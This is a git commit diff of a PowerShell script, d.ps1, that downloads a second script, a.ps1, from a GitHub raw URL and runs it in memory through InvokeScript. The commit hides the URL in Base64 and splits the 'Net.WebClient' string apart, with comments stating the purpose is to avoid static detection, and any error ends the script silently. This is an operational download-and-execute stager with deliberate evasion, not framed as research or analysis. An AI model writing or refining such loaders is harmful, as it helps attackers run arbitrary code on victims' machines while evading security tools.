0e3532ef28173be7e298ca7026d2d65f08d35b4b
jktvz <admininfogathering@proton.me>
2026-02-17 00:51:47 +0300

    Update d.ps1

--- d.ps1
+++ d.ps1
@@ -1,19 +1,17 @@
-# $Active Switch
-$v_act = 1
-
-if ($v_act -eq 1) {
+$v = 1
+if ($v -eq 1) {
     try {
-        # Encoded URL for a.ps1
-        $d_str = "h"+"tt"+"ps"+":/""/raw.githubusercontent.com/jktvz/J/main/a.ps1"
-        $u_agt = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
+        # Base64 encoded URL for a.ps1
+        $u = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AagBrAHQAdgB6AC8ASgAvAG0AYQBpAG4ALwBhAC4AcABzADEA'))
         
-        $w_cl = New-Object System.Net.WebClient
-        $w_cl.Headers.Add("User-Agent", $u_agt)
+        # Fragmenting "Net.WebClient" to avoid static detection
+        $t = "Net.Web" + "Client"
+        $o = New-Object $t
+        $o.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
         
-        # Download and execute using a less-monitored method
-        $payload = $w_cl.DownloadString($d_str)
-        $ExecutionContext.InvokeCommand.InvokeScript($payload)
-    } catch {
-        exit
-    }
+        # Download as data, then convert and execute
+        $b = $o."DownloadData"($u)
+        $c = [System.Text.Encoding]::UTF8.GetString($b)
+        $ExecutionContext.InvokeCommand.InvokeScript($c)
+    } catch { exit }
 }
